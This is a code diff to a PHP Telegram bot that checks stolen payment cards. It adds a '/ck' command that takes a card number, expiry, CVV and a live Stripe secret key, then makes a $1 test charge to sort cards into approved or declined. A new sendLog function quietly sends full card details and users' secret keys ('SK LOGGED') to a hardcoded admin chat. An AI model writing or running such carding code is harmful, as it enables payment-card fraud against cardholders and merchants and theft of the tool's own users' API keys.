@@ -40,7 +40,7 @@ sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b
 
 //////////=========[help Command]=========//////////
  elseif (strpos($message, "/help") === 0){
-sendMessage($chatId, "<b><u> LIST OF COMMANDS AVAILABE</u></b>%0A%0A%0A<b>check bin:<code>/bin xxxxx</code></b>%0A<b>Check sk: <code>/sk sk_livexxxxxxxxxxx</code></b>%0A<b>check Algorithm card:<code>/agt xxxxxxxxxx|xx|xx|xxx </code></b>%0A<b>Your info: <code>/info</code></b>%0A<b>Change Log version: <code>/log</code></b> %0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code> ", $message_id);
+sendMessage($chatId, "<b><u> LIST OF COMMANDS AVAILABE</u></b>%0A%0A%0A<b>check bin:<code>/bin xxxxx</code></b>%0A<b>Check sk: <code>/sk sk_livexxxxxxxxxxx</code></b>%0A<b>check Algorithm card:<code>/agt xxxxxxxxxx|xx|xx|xxx </code></b>%0A<b>Your info: <code>/info</code></b>%0A<b>Change Log version: <code>/log</code></b>%0A<b>Custom SK Charge:</b><code>/ck xxxxxxxxxx|xx|xx|xxx|sk_live_xxxx</code> %0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code> ", $message_id);
 }
 //////////=========[Info Command]=========//////////
 
@@ -123,7 +123,7 @@ elseif (strpos($message, "/aut") === 0){
  $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
  $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
  $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
- sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 5 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+ sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 6 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
 }
 //=====================[chg]=============================//
 elseif (strpos($message, "/chg") === 0){
@@ -133,7 +133,7 @@ elseif (strpos($message, "/chg") === 0){
     $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
     $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
     $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 5 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 6 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
    }
 //=====================[rape]=============================//
 elseif (strpos($message, "/rape") === 0){
@@ -143,7 +143,7 @@ elseif (strpos($message, "/rape") === 0){
     $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
     $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
     $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 4 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 6 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
    }
 
 //=====================[kcc]=============================//
@@ -154,7 +154,7 @@ elseif (strpos($message, "/kcc") === 0){
     $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
     $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
     $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 5 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 6 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
    }
 //=====================[ccn]=============================//
 elseif (strpos($message, "/ccn") === 0){
@@ -164,7 +164,7 @@ elseif (strpos($message, "/ccn") === 0){
     $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
     $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
     $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
-    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 5 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+    sendMessage($chatId, "<b><u> Bot Maintenance mode is enabled !.</u></b>%0A%0A <b> The are 6 commands available for you use. Please use <code>/help</code> to show available commands</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
    }
 //=====================[agt]=============================//
 elseif (strpos($message, "/agt") === 0){
@@ -241,12 +241,177 @@ $amt = '1';
         }
         else {
             sendMessage($chatId, "<b>SERVER ERROR</b>%0A<b>Response -» <code>$msg1 | $msg1a | $result1 </code></b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+            sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
+            sendLog($chatId, "<b>BUG REPORTED</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
         }
     
     }
+//=======================[ck]=======================//
+    elseif (strpos($message, "/ck") === 0){
+    
+$message = substr($message, 4);
+$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
+$mm = multiexplode(array(":", "/", " ", "|"), $message)[1];
+$yy = multiexplode(array(":", "/", " ", "|"), $message)[2];
+$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
+$sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
+                $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'|'.$sk.'';
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                'Host: lookup.binlist.net',
+                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+                $fim = curl_exec($ch);
+                $bank = GetStr($fim, '"bank":{"name":"', '"');
+                $name = GetStr($fim, '"name":"', '"');
+                $brand = GetStr($fim, '"brand":"', '"');
+                $country = GetStr($fim, '"country":{"name":"', '"');
+                $emoji = GetStr($fim, '"emoji":"', '"');
+                $scheme = GetStr($fim, '"scheme":"', '"');
+                $type = GetStr($fim, '"type":"', '"');
+                if(strpos($fim, '"type":"credit"') !== false){
+                $bin = 'Credit';
+                }else{
+                $bin = 'Debit';
+                };
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+                $result1 = curl_exec($ch);
+                $tok1 = Getstr($result1,'"id": "','"');
+                $msg1 = Getstr($result1,'"message": "','"');
+                if(strpos($result1, "card_error")){
+                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($result1, "card_declined")){
+                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($result1, "rate_limit")){
+                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($result1, "invalid_cvc")){
+                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($result1, "sources_required_type_param")){
+                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($msg1, "invalid_request_error")){
+                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Please input SK </b>%0A<b>Gateway -» Stripe Custom sk charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
+                $result2 = curl_exec($ch);
+                $tok2 = Getstr($result2,'"id": "','"');
+                $msg2 = Getstr($result2,'"message": "','"');
+                if(strpos($result2, "card_error")){
+                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($result1, "invalid_cvc")){
+                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+                if (strpos($result1, "sources_required_type_param")){
+                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  return;
+                }
+
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$tok2.'');
+                $result3 = curl_exec($ch);
+                $msg3 = Getstr($result3,'"message": "','"');
+                $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+                $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
+                $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
+                if(strpos($result3, '"status": "succeeded"' )) {
+                sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 1$ ✅</b>%0A<b>Response -» CHARGED 1$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Custom sk charge v2 </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                sendLog($chatId, "<b>SK LOGGED</b>%0A%0A<b>card:</b><code>$lista</code>%0A<b> RECEPIT URL -» $rcp</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                return;
+                }
+                if(strpos($result3, "insufficient_funds" )) {
+                  sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Custom sk charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+                  return;
+                }
+                if ((strpos($result3, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe Custom sk charge v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                }
+                if(strpos($result3,'"code": "incorrect_cvc"')){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if(strpos($result3,'"code": "incorrect_cvc"')){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» HOLDERLOCKED ⚠️</b>%0A<b>Response -» Transaction Not Allowed </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, "fraudulent"))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, "expired_card"))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, "generic_declined"))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                    }
+                  if ((strpos($result3, "do_not_honor"))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, 'rate_limit'))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                    
+                  if ((strpos($result3, "Your card was declined."))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                  if ((strpos($result3, ' "message": "testmode_charges_only"'))){
+                    sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+
+
+                else {
+                  sendMessage($chatId, "<b>SERVER ERROR</b>%0A<b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
+                  sendLog($chatId, "<b>BUG REPORTED</b>%0A<b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>%0A%0A<b><code>Maintenance mode is enabled</code></b>%0A<b>Bot version:</b> <code>2.0 - DEBUG</code>", $message_id);
+                  }
+                }
 
 function sendMessage ($chatId, $message, $message_id){
     $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
     file_get_contents($url);
+    };
+    function sendLog ($chatId, $message, $message_id){
+        $url = $GLOBALS[website]."/sendMessage?chat_id=1090979938&text=".$message."&parse_mode=HTML";
+        file_get_contents($url);
     };
 ?> 
